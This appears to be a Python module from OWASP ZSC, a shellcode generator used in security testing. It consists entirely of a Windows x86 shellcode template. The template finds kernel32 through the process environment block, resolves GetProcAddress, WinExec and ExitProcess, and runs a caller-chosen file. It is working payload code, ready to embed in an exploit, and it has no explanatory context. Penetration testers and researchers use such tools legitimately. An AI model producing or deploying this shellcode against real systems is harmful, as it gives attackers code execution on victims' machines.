#!/usr/bin/env python
'''
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
'''
from core import stack
from math import ceil


def exc(file_to_exec, file_name):
    return '''
xor    %ecx,%ecx
mov    %fs:0x30(%ecx),%eax
mov    0xc(%eax),%eax
mov    0x14(%eax),%esi
lods   %ds:(%esi),%eax
xchg   %eax,%esi
lods   %ds:(%esi),%eax
mov    0x10(%eax),%ebx
mov    0x3c(%ebx),%edx
add    %ebx,%edx
mov    0x78(%edx),%edx
add    %ebx,%edx
mov    0x20(%edx),%esi
add    %ebx,%esi
xor    %ecx,%ecx
inc    %ecx
lods   %ds:(%esi),%eax
add    %ebx,%eax
cmpl   $0x50746547,(%eax)
jne    23 <.text+0x23>
cmpl   $0x41636f72,0x4(%eax)
jne    23 <.text+0x23>
cmpl   $0x65726464,0x8(%eax)
jne    23 <.text+0x23>
mov    0x24(%edx),%esi
add    %ebx,%esi
mov    (%esi,%ecx,2),%cx
dec    %ecx
mov    0x1c(%edx),%esi
add    %ebx,%esi
mov    (%esi,%ecx,4),%edx
add    %ebx,%edx
push   %ebx
push   %edx
xor    %ecx,%ecx
push   %ecx
mov    $0x61636578,%ecx
push   %ecx
subl   $0x61,0x3(%esp)
push   $0x456e6957
push   %esp
push   %ebx
call   *%edx
add    $0x8,%esp
pop    %ecx
push   %eax
xor    %ecx,%ecx
push   %ecx
{0}
xor    %ebx,%ebx
mov    %esp,%ebx
xor    %ecx,%ecx
inc    %ecx
push   %ecx
push   %ebx
call   *%eax
add    ${1},%esp
pop    %edx
pop    %ebx
xor    %ecx,%ecx
mov    $0x61737365,%ecx
push   %ecx
subl   $0x61,0x3(%esp)
push   $0x636f7250
push   $0x74697845
push   %esp
push   %ebx
call   *%edx
xor    %ecx,%ecx
push   %ecx
call   *%eax
'''.format(file_to_exec, hex(int(8 + 4 * (ceil(len(file_name) / float(4))))))


def run(data):
    file_to_exec = data[0]
    return exc(stack.generate(file_to_exec, "%ecx", "string"), file_to_exec)
